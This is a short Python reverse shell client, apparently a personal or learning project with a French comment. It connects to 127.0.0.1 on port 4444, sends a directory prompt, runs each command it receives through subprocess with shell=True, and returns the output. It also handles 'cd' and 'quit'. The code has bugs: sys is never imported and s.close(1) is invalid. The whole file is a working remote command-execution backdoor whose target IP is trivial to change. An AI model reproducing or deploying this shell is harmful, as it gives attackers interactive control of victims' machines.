# coding: utf-8
# python 3.7.1 x86_64

import os
import socket
import subprocess

__author__ = "Maillard Alexandre"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",4444))

while True:
    try:
        # on garde le path du dossier de lancement
        current_path = os.getcwd().encode("utf-8")
        while True:
            s.send(os.getcwd().encode("utf-8"))
            s.send(b"> ")
            data = s.recv(2048).decode("utf-8")
            if data.rstrip("\n") == "quit":
                s.close()
                sys.exit(0)
            elif 'cd' in data.rstrip("\n"):
                data = data.rstrip("\n").split()
                if len(data)  == 1:
                    new_path = current_path
                elif len(data) == 2:
                    new_path = data[1]
                os.chdir(new_path)
            else:
                p = subprocess.Popen(data, shell=True,stdout=subprocess.PIPE,
                      stderr=subprocess.PIPE)
                out, err = p.communicate()
                s.send(out)
                if err:
                    s.send(err)
    except KeyboardInterrupt:
        s.close(1)
sys.exit(0)
